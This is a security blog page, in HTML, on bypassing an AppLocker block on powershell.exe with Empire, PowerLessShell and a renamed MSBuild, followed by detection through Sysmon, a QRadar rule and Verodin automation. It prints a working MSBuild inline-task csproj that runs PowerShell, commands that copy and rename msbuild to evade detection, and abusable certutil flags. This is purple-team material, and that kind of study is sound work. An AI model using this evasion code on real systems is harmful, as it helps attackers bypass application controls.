@@ -1,0 +1,374 @@
+<!doctype html><html dir=ltr lang=en data-theme class="html theme--light"><head>
+<title>
+|
+Living The Sweet PowerShell #2
+</title>
+<meta charset=utf-8><meta name=generator content="Hugo 0.92.2"><meta name=viewport content="width=device-width,initial-scale=1,viewport-fit=cover">
+<meta name=author content>
+<meta name=description content="Just Curious">
+<link rel=stylesheet href=/scss/main.min.1147aa5bacb4bce677a0e264073829caedb82fd18ea07a5f1d80521f539d1c45.css integrity="sha256-EUeqW6y0vOZ3oOJkBzgpyu24L9GOoHpfHYBSH1OdHEU=" crossorigin=anonymous type=text/css>
+<link rel=stylesheet href=/css/markupHighlight.min.73ccfdf28df555e11009c13c20ced067af3cb021504cba43644c705930428b00.css integrity="sha256-c8z98o31VeEQCcE8IM7QZ688sCFQTLpDZExwWTBCiwA=" crossorigin=anonymous type=text/css>
+<link rel=stylesheet href=/fontawesome/css/fontawesome.min.7d272de35b410fb165377550cdf9c4d3a80fbbcc961e111914e4d5c0eaf5729f.css integrity="sha256-fSct41tBD7FlN3VQzfnE06gPu8yWHhEZFOTVwOr1cp8=" crossorigin=anonymous type=text/css>
+<link rel=stylesheet href=/fontawesome/css/solid.min.55d8333481b07a08e07cf6f37319753a2b47e99f4c395394c5747b48b495aa9b.css integrity="sha256-VdgzNIGwegjgfPbzcxl1OitH6Z9MOVOUxXR7SLSVqps=" crossorigin=anonymous type=text/css>
+<link rel=stylesheet href=/fontawesome/css/regular.min.a7448d02590b43449364b6b5922ed9af5410abb4de4238412a830316dedb850b.css integrity="sha256-p0SNAlkLQ0STZLa1ki7Zr1QQq7TeQjhBKoMDFt7bhQs=" crossorigin=anonymous type=text/css>
+<link rel=stylesheet href=/fontawesome/css/brands.min.9ed75a5d670c953fe4df935937674b4646f92674367e9e66eb995bb04e821647.css integrity="sha256-ntdaXWcMlT/k35NZN2dLRkb5JnQ2fp5m65lbsE6CFkc=" crossorigin=anonymous type=text/css>
+<link rel="shortcut icon" href=/favicon.ico type=image/x-icon>
+<link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png>
+<link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png>
+<link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png>
+<link rel=canonical href=https://canyoleri.github.io/posts/livingsweetpwsh2/>
+<script type=text/javascript src=/js/anatole-header.min.46e6a54097480084f8f52c20ca1aa7425b4fad17029a887fd4017b12e311a72d.js integrity="sha256-RualQJdIAIT49SwgyhqnQltPrRcCmoh/1AF7EuMRpy0=" crossorigin=anonymous></script>
+<script type=text/javascript src=/js/anatole-theme-switcher.min.4c31f3cf7e8e609c897dba88aecac0e8db1ebb4e5c841d3f9ffb01d463973678.js integrity="sha256-TDHzz36OYJyJfbqIrsrA6Nseu05chB0/n/sB1GOXNng=" crossorigin=anonymous></script>
+<meta name=twitter:card content="summary">
+<meta name=twitter:title content="Living The Sweet PowerShell #2">
+<meta name=twitter:description content="In some domain environments due to security measures or hardening the execution of powershell.exe and powershell_ise.exe processes can be blocked through GPO/Applocker. These restrictions can sometimes be configured incorrectly. We can&rsquo;t directly run our PowerShell commands or scripts but PowerShell is not limited to just powershell.exe, we can bypass the limitations.
+In today’s scenario from the Red Team perspective we will establish a connection using Empire in an environment where powershell.">
+<meta property="og:title" content="Living The Sweet PowerShell #2">
+<meta property="og:description" content="In some domain environments due to security measures or hardening the execution of powershell.exe and powershell_ise.exe processes can be blocked through GPO/Applocker. These restrictions can sometimes be configured incorrectly. We can&rsquo;t directly run our PowerShell commands or scripts but PowerShell is not limited to just powershell.exe, we can bypass the limitations.
+In today’s scenario from the Red Team perspective we will establish a connection using Empire in an environment where powershell.">
+<meta property="og:type" content="article">
+<meta property="og:url" content="https://canyoleri.github.io/posts/livingsweetpwsh2/"><meta property="article:section" content="posts">
+<meta property="article:published_time" content="2020-09-05T19:06:23+03:00">
+<meta property="article:modified_time" content="2020-09-05T19:06:23+03:00"><meta property="og:site_name" content="Cyber Security">
+<script type=application/ld+json>{"@context":"http://schema.org","@type":"BlogPosting","articleSection":"posts","name":"Living The Sweet PowerShell #2","headline":"Living The Sweet PowerShell #2","alternativeHeadline":"","description":"
+      
+        In some domain environments due to security measures or hardening the execution of powershell.exe and powershell_ise.exe processes can be blocked through GPO\/Applocker. These restrictions can sometimes be configured incorrectly. We can\u0026rsquo;t directly run our PowerShell commands or scripts but PowerShell is not limited to just powershell.exe, we can bypass the limitations.\nIn today’s scenario from the Red Team perspective we will establish a connection using Empire in an environment where powershell.
+
+
+      
+
+
+    ","inLanguage":"en-us","isFamilyFriendly":"true","mainEntityOfPage":{"@type":"WebPage","@id":"https:\/\/canyoleri.github.io\/posts\/livingsweetpwsh2\/"},"author":{"@type":"Person","name":""},"creator":{"@type":"Person","name":""},"accountablePerson":{"@type":"Person","name":""},"copyrightHolder":{"@type":"Person","name":""},"copyrightYear":"2020","dateCreated":"2020-09-05T19:06:23.00Z","datePublished":"2020-09-05T19:06:23.00Z","dateModified":"2020-09-05T19:06:23.00Z","publisher":{"@type":"Organization","name":"","url":"https://canyoleri.github.io/","logo":{"@type":"ImageObject","url":"https:\/\/canyoleri.github.io\/favicon-32x32.png","width":"32","height":"32"}},"image":[],"url":"https:\/\/canyoleri.github.io\/posts\/livingsweetpwsh2\/","wordCount":"1580","genre":[],"keywords":[]}</script>
+</head>
+<body class=body>
+<div class=wrapper>
+<aside class=wrapper__sidebar><div class="sidebar
+animated fadeInDown">
+<div class=sidebar__content>
+<div class=sidebar__introduction>
+<img class=sidebar__introduction-profileimage src=/images/profile.jpg alt="profile picture">
+<div class=sidebar__introduction-title>
+<a href=/>Cyber Security</a>
+</div>
+<div class=sidebar__introduction-description>
+<p>Just Curious</p>
+</div>
+</div>
+<ul class=sidebar__list>
+<li class=sidebar__list-item>
+<a href=https://www.linkedin.com/in/can-yoleri/ target=_blank rel="noopener me" aria-label=Linkedin title=Linkedin>
+<i class="fa-brands fa-linkedin-in fa-2x" aria-hidden=true></i>
+</a>
+</li>
+<li class=sidebar__list-item>
+<a href=https://twitter.com/CanYoleri target=_blank rel="noopener me" aria-label=Twitter title=Twitter>
+<i class="fa-brands fa-twitter fa-2x" aria-hidden=true></i>
+</a>
+</li>
+</ul>
+</div><footer class="footer footer__sidebar">
+<ul class=footer__list>
+<li class=footer__item>
+&copy;
+Can Yoleri 2020-2024
+</li>
+</ul>
+</footer>
+<script type=text/javascript src=/js/medium-zoom.min.fae9ac8895995fe91958b3954be11e96025824a04770726a3531e119ddd2d576.js integrity="sha256-+umsiJWZX+kZWLOVS+EelgJYJKBHcHJqNTHhGd3S1XY=" crossorigin=anonymous></script></div>
+</aside>
+<main class=wrapper__main>
+<header class=header><div class="animated fadeInDown">
+<a role=button class=navbar-burger data-target=navMenu aria-label=menu aria-expanded=false>
+<span aria-hidden=true class=navbar-burger__line></span>
+<span aria-hidden=true class=navbar-burger__line></span>
+<span aria-hidden=true class=navbar-burger__line></span>
+</a>
+<nav class=nav>
+<ul class=nav__list id=navMenu>
+<li class=nav__list-item>
+<a href=/ title>Home</a>
+</li>
+<li class=nav__list-item>
+<a href=/posts/ title>Post</a>
+</li>
+</ul>
+<ul class="nav__list nav__list--end">
+<li class=nav__list-item>
+<div class=themeswitch>
+<a title="Switch Theme">
+<i class="fas fa-adjust fa-fw" aria-hidden=true></i>
+</a>
+</div>
+</li>
+</ul>
+</nav>
+</div>
+</header>
+<div class="post
+animated fadeInDown">
+<div class=post__content>
+<h1>Living the Sweet PowerShell #2</h1>
+<p>In some domain environments due to security measures or hardening the execution of powershell.exe and powershell_ise.exe processes can be blocked through GPO/Applocker. These restrictions can sometimes be configured incorrectly. We can&rsquo;t directly run our PowerShell commands or scripts but PowerShell is not limited to just powershell.exe, we can bypass the limitations.</p>
+<p>In today’s scenario from the Red Team perspective we will establish a connection using Empire in an environment where powershell.exe is disabled. This will enable us to execute PowerShell scripts or commands. On the Blue Team side we will discuss strategies for detecting these attacks, developing protective rules and leveraging the Mandiant Security Validation (Verodin) product to automate and test our custom attack scenarios. This testing aims to evaluate the effectiveness of security products and SIEM rules in responding to such threats.</p>
+<p>What is in the environment:</p>
+<ul>
+<li>
+<p>Sysmon</p>
+</li>
+<li>
+<p>QRadar</p>
+</li>
+<li>
+<p>Configured PowerShell logs (Module Logging, etc.)</p>
+</li>
+<li>
+<p>Verodin</p>
+</li>
+</ul>
+<p>I&rsquo;ve blocked the powershell.exe and powershell_ise.exe processes with AppLocker.</p>
+<p><img src=/images/livingsweetpwsh2/applocker-block.png alt></p>
+<p><img src=/images/livingsweetpwsh2/pwshblock.png alt></p>
+<p><strong>Attacker side:</strong></p>
+<p>I set up Empire and started a Listener.</p>
+<p><img src=/images/livingsweetpwsh2/listener.png alt></p>
+<p>Our launcher code is as follows</p>
+<p><img src=/images/livingsweetpwsh2/launcher.png alt></p>
+<p>To execute a PowerShell script or code via MSBuild, I need to use the PowerLessShell tool. PowerLessShell is a tool that allows you to run your PowerShell scripts or code through MSBuild without using powershell.exe</p>
+<p><a href=https://github.com/Mr-Un1k0d3r/PowerLessShell>PowerLessShell</a></p>
+<p>I decoded the launcher code encrypted with Base64 and saved it as a file named pw.ps1.</p>
+<p><img src=/images/livingsweetpwsh2/base64.png alt></p>
+<p>I ran PowerLessShell, entered the necessary values, and created a csproj and csproj.bat file.</p>
+<p><img src=/images/livingsweetpwsh2/powerlesshel.png alt></p>
+<p><strong>csproj file</strong></p>
+<p><img src=/images/livingsweetpwsh2/sky.png alt></p>
+<p><img src=/images/livingsweetpwsh2/sky2.png alt></p>
+<p><img src=/images/livingsweetpwsh2/sky3.png alt></p>
+<p><strong>csproj bat file</strong></p>
+<p><img src=/images/livingsweetpwsh2/csproj-bat.png alt></p>
+<p><img src=/images/livingsweetpwsh2/csproj-bat2.png alt></p>
+<p>As an attacker all I need to do now is to execute the sky.csproj.bat file on the target system.</p>
+<p><img src=/images/livingsweetpwsh2/runpayload.png alt></p>
+<p><strong>Build started.</strong></p>
+<p><strong>Now active!</strong></p>
+<p><img src=/images/livingsweetpwsh2/runpayload2.png alt></p>
+<p><img src=/images/livingsweetpwsh2/runpayload3.png alt></p>
+<p>When the bat file is executed it copies msbuild.exe and renames it, effectively bypassing any rule or rules related to imagename == msbuild.exe in the target system&rsquo;s SIEM, thus preventing an alarm from being triggered. It can also avoid products like AV/EDR by using legitimate Windows processes (such as certutil).</p>
+<p><strong>Defender side</strong></p>
+<p>Let&rsquo;s start reviewing the logs that appear when we run the above .bat file</p>
+<p>cmd.exe is accessing the certutil process with 0x1fffff permissions. Since this could indicate an abnormal situation, let&rsquo;s continue examining the logs.</p>
+<p><img src=/images/livingsweetpwsh2/log2.png alt></p>
+<p>A file named <strong>ZRdFAwXBUI.exe</strong> has been created in the Microsoft.Net\Framework* directory. However, this is not a standard Windows process, and the nature of its name further confirms our suspicions about an abnormal situation.</p>
+<p><img src=/images/livingsweetpwsh2/log3.png alt></p>
+<p>I&rsquo;m continuing to review the logs. The process I observed a moment ago has created a DLL file in the temporary directory.</p>
+<p><img src=/images/livingsweetpwsh2/log4.png alt></p>
+<p><img src=/images/livingsweetpwsh2/log5.png alt></p>
+<p>This process has also loaded the System.Management.Automation.dll file, a critical component for PowerShell operations.. Observing this DLL file leads us to suspect that the process might be attempting to utilize PowerShell functionalities.</p>
+<p><img src=/images/livingsweetpwsh2/log6.png alt></p>
+<p>As I mentioned earlier, PowerLessShell copies and renames the MSBuild process, However, when Windows own processes are executed a field named OriginalFileName is included in the Process Create log. Even if the MSBuild process&rsquo;s name is changed to something like zedeleyici.exe, we would see its real name, MSBuild.exe in the OriginalFileName part.</p>
+<p>When I look at the Process Create log below, I see ZRdFAwXBUI.exe in the Image section even though the OriginalFileName is MSBuild.exe.</p>
+<p><img src=/images/livingsweetpwsh2/originalfilenamelogs.png alt></p>
+<p><img src=/images/livingsweetpwsh2/log7.png alt></p>
+<p>In that case, I can write a rule in QRadar to generate an alarm for Process Create logs where the ImageName and OriginalFileName do not match. When I write an AQL as below, it gives me what I&rsquo;m looking for. I&rsquo;m adding this as a rule.</p>
+<pre tabindex=0><code>SELECT ImageName, OriginalFileName FROM events
+WHERE &quot;EventID&quot;= '1' AND
+LOGSOURCENAME(logsourceid) ILIKE '%ZEDELEYICI%'
+AND LOWER(&quot;ImageName&quot;)
+!= LOWER(&quot;OriginalFileName&quot;) AND &quot;ImageName&quot; IS NOT NULL AND &quot;OriginalFileName&quot; IS NOT NULL AND &quot;OriginalFileName&quot; &lt;&gt; '?'
+</code></pre><ul>
+<li>Eliminating false positives is necessary.</li>
+</ul>
+<p><img src=/images/livingsweetpwsh2/qradar-aql.png alt></p>
+<p>In my previous blog post, I mentioned the importance of having PowerShell logging enabled. Because PowerShell logging is enabled, I can see the running PowerShell script in the log below.</p>
+<p><img src=/images/livingsweetpwsh2/log8.png alt></p>
+<p><img src=/images/livingsweetpwsh2/log11.png alt></p>
+<p><strong>Host Application = ZRdFAwXBUI.exe</strong></p>
+<p><img src=/images/livingsweetpwsh2/log12.png alt></p>
+<p>The same abnormal process is using csc.exe, which is a legitimate Windows process but also provides opportunities for abuse.</p>
+<p><img src=/images/livingsweetpwsh2/log9.png alt></p>
+<p>_<em>PSScriptPolicyTest</em>&lt;random_number>.ps1 files are used by PowerShell to test AppLocker. If the file runs it assumes that AppLocker is disabled. While this is actually a normal behavior for PowerShell, seeing it in the imagename section appears abnormal.</p>
+<p><img src=/images/livingsweetpwsh2/log10.png alt></p>
+<p>I see that the certutil process is being used with the -decodehex parameter. Since certutil is a legitimate process but can also be abused, especially when used with the following parameters, it&rsquo;s important to ensure that it generates an alarm for further investigation:</p>
+<p><strong>-decodehex</strong></p>
+<p><strong>-urlcache -split</strong></p>
+<p><strong>-encode</strong></p>
+<p><strong>-decode</strong></p>
+<p><img src=/images/livingsweetpwsh2/decodehex.png alt></p>
+<p>So far, I&rsquo;ve tried to show how we can take precautions. However, another critical aspect is the automation of these attack scenarios. Manual testing of our developed attack scenarios and simultaneous log examination can be incredibly time-consuming. With the Verodin, Mandiant Security Validation product, we have the capability to automate the attack scenarios we&rsquo;ve designed. This automation allows you to improve SIEM, network, and endpoint security products by observing the SIEM alarms, logs, and detection capabilities generated by the scenarios, whether the scenario is blocked or not. This visibility enables you to enhance your security posture by identifying and addressing any gaps.</p>
+<p>The csproj file I created with PowerLessShell above is different from the csproj file I added to Verodin. When testing with Verodin, since I won&rsquo;t be establishing a connection to Empire, a csproj that allows me to execute commands in PowerShell serves my purpose.</p>
+<p>While preparing a csproj file to execute PowerShell code, I came across a file previously written under the name <a href=https://gist.githubusercontent.com/egre55/7a6b6018c9c5ae88c63bdb23879df4d0/raw/2a27c22e8d3436640e7f1ac5219095af3075b446/powashell.csproj>powashell.csproj</a></p>
+<p>In powashell.csproj, I added an encoded PowerShell command to the script as follows.</p>
+<pre tabindex=0><code>&lt;Project ToolsVersion=&quot;4.0&quot; xmlns=&quot;http://schemas.microsoft.com/developer/msbuild/2003&quot;&gt;
+  &lt;!-- This inline task executes c# code. --&gt;
+  &lt;!-- C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe powaShell.csproj --&gt;
+  &lt;Target Name=&quot;Hello&quot;&gt;
+   &lt;ClassExample /&gt;
+  &lt;/Target&gt;
+  &lt;UsingTask
+    TaskName=&quot;ClassExample&quot;
+    TaskFactory=&quot;CodeTaskFactory&quot;
+    AssemblyFile=&quot;C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll&quot; &gt;
+  &lt;Task&gt;
+   &lt;Reference Include=&quot;C:\Windows\assembly\GAC_MSIL\System.Management.Automation\1.0.0.0__31bf3856ad364e35\System.Management.Automation.dll&quot; /&gt;
+   &lt;!-- Your PowerShell Path May vary --&gt;
+      &lt;Code Type=&quot;Class&quot; Language=&quot;cs&quot;&gt;
+        &lt;![CDATA[
+
+      // all code by Casey Smith @SubTee
+
+      using System;
+      using System.Reflection;
+      using Microsoft.Build.Framework;
+      using Microsoft.Build.Utilities;
+      
+      using System.Collections.ObjectModel;
+      using System.Management.Automation;
+      using System.Management.Automation.Runspaces;
+      using System.Text;
+        
+      public class ClassExample :  Task, ITask
+      {
+        public override bool Execute()
+        {
+          //Console.WriteLine(&quot;Hello From a Class.&quot;);
+          Console.WriteLine(powaShell.RunPSCommand());
+          return true;
+        }
+      }
+      
+      //Based on Jared Atkinson's And Justin Warner's Work
+      public class powaShell
+      {
+        public static string RunPSCommand()
+        {
+                    
+          //Init stuff
+          
+          InitialSessionState iss = InitialSessionState.CreateDefault();
+          iss.LanguageMode = PSLanguageMode.FullLanguage;
+          Runspace runspace = RunspaceFactory.CreateRunspace(iss);
+          runspace.Open();
+          RunspaceInvoke scriptInvoker = new RunspaceInvoke(runspace);
+          Pipeline pipeline = runspace.CreatePipeline();
+          
+          //Interrogate LockDownPolicy
+          Console.WriteLine(System.Management.Automation.Security.SystemPolicy.GetSystemLockdownPolicy());        
+          
+          
+          
+          //Add commands
+          pipeline.Commands.AddScript((&quot;powershell -enc dwBoAG8AYQBtAGkA -noexit&quot;));
+          //Prep PS for string output and invoke
+          pipeline.Commands.Add(&quot;Out-String&quot;);
+          Collection&lt;PSObject&gt; results = pipeline.Invoke();
+          
+
+          //Convert records to strings
+          StringBuilder stringBuilder = new StringBuilder();
+          foreach (PSObject obj in results)
+          {
+            stringBuilder.Append(obj);
+          }
+          return stringBuilder.ToString().Trim();     
+        }
+      }
+              
+        ]]&gt;
+      &lt;/Code&gt;
+    &lt;/Task&gt;
+  &lt;/UsingTask&gt;
+&lt;/Project&gt;
+</code></pre><p>Now, let&rsquo;s automate the scenario by adding it to Verodin.</p>
+<p>When logged into Verodin we go to the Library section and select Files. Then we choose upload file</p>
+<p><img src=/images/livingsweetpwsh2/verodinfiles.png alt></p>
+<p>A screen like this appears. I fill in the File Notes and Applicable OS/platform sections, select the csproj file and then click on &ldquo;Upload File.&rdquo;</p>
+<p><img src=/images/livingsweetpwsh2/verodin-upload-file.png alt></p>
+<p>We have added our csproj file. (I have previously added and created actions.)</p>
+<p><img src=/images/livingsweetpwsh2/verodin-up-success.png alt></p>
+<p>After adding our file we need to create an action. I go to Library > Actions. I will create a Host CLI action I select that option from the Add Action section.</p>
+<p><img src=/images/livingsweetpwsh2/verodin-actions.png alt></p>
+<p>In the <strong>Action User Profile</strong> section, I specify that it will work with the System user.</p>
+<p>In the <strong>Add File Dependencies</strong> section, I select the PWSH-without-pwsh.exe.csproj file I added earlier and specify the directory it will work in.</p>
+<p><img src=/images/livingsweetpwsh2/verodin-actions2.png alt></p>
+<p>In this section, I specify that it will run via cmd.exe. If desired we can also run it via PowerShell, Python or Bash.</p>
+<p><img src=/images/livingsweetpwsh2/verodin-actions3.png alt></p>
+<p>In the Command Input section I write what parameters this attack scenario will run with and what it will do.</p>
+<pre tabindex=0><code>#x64 or x86  
+for /F &quot;delims==&quot; %A in ('systeminfo ^|findstr /B /C:&quot;System Type&quot;') do @set Arch=%A
+  auto,4,true,60
+  success_zero
+
+
+if /I &quot;%Arch:86=%&quot; equ &quot;%Arch%&quot; (set Part1=C:\Windows\Microsoft.NET\Framework64\) ELSE (set Part1=C:\Windows\Microsoft.NET\Framework\)
+  auto,4,true,60
+  success_zero
+
+#copying MSBuild.exe to the temp area as ms.exe.
+copy %Part1%v4.0.30319\msbuild.exe %tmp%\ms.exe
+  auto,4,true,60
+  success_zero
+
+#opening cmd and running ms.exe along with the csproj file.
+start cmd.exe @cmd /k &quot;%tmp%\ms.exe c:\windows\temp\PWSH-without-pwsh.exe.csproj&quot;
+  auto,10,true,60
+  success_zero
+
+#If the attack is successful ms.exe process will be running.
+tasklist /svc | findstr ms.exe
+  auto,4,true,60
+  success_zero
+
+#attack is successful and we kill the ms.exe process.
+taskkill /im &quot;ms.exe&quot; /f
+  auto,4,true,60
+  cleanup
+
+#deleting csproj file  
+del c:\windows\temp\PWSH-without-pwsh.exe.csproj
+  auto,4,true,60
+  cleanup
+
+#deleting ms.exe process.
+del %tmp%\ms.exe
+  auto,4,true,60
+  cleanup
+</code></pre><p>We press the Validate Syntax button to check if there are any issues with what we&rsquo;ve written. If everything is correct it shows &ldquo;Successful.&rdquo;</p>
+<p><img src=/images/livingsweetpwsh2/verodin-actions4.png alt></p>
+<p>We write the name and description of the action.</p>
+<ul>
+<li>Action name: [Name]</li>
+<li>Description: [Description]</li>
+<li>Attack vector: general-vector</li>
+<li>Attacker location: Internal</li>
+<li>Behavior Type: General Behavior</li>
+<li>Covert: No</li>
+<li>OS/Platform: Windows</li>
+<li>Stage of Attack: Execution</li>
+</ul>
+<p>I tagged the user as #powershell and #msbuild.</p>
+<p><img src=/images/livingsweetpwsh2/verodin-actions5.png alt></p>
+<p>I press the &ldquo;Save and Approve Anywhere&rdquo; button to save. Then I navigate to Library > Actions and when I search for &ldquo;Execution: PowerShell without powershell.exe&rdquo; I can see the action I created.</p>
+<p><img src=/images/livingsweetpwsh2/verodin-actions7.png alt></p>
+<p>I&rsquo;ll try running the action I created. I press the blue play button and select the Endpoint Actor option to choose which actor I want to use for this scenario. Then I click on Run Now to start.</p>
+<p><img src=/images/livingsweetpwsh2/verodin-run.png alt></p>
+<p><img src=/images/livingsweetpwsh2/verodin-actions-run.png alt></p>
+<p>The scenario I tested triggered the SIEM rules I wrote above, so I caught the attack. However, it&rsquo;s marked as &ldquo;Not Blocked&mldr;&rdquo;</p>
+<p><img src=/images/livingsweetpwsh2/verodin-actions-run2.png alt></p>
+<p>One of the best features is that when creating the action it can provide us with the outputs of the commands we write, as shown below. This allows us to see whether it actually worked or if there was an error.</p>
+<p><img src=/images/livingsweetpwsh2/verodin-actions-run3.png alt></p>
+<p>When we examine the Events section we can easily see the matching QRadar rules.</p>
+<p><img src=/images/livingsweetpwsh2/verodin-actions-qradar.png alt></p>
+</div>
+<div class=post__footer>
+</div>
+</div>
+</main>
+</div><footer class="footer footer__base">
+<ul class=footer__list>
+<li class=footer__item>
+&copy;
+Can Yoleri 2020-2024
+</li>
+</ul>
+</footer>
+<script type=text/javascript src=/js/medium-zoom.min.fae9ac8895995fe91958b3954be11e96025824a04770726a3531e119ddd2d576.js integrity="sha256-+umsiJWZX+kZWLOVS+EelgJYJKBHcHJqNTHhGd3S1XY=" crossorigin=anonymous></script></body>
+</html>
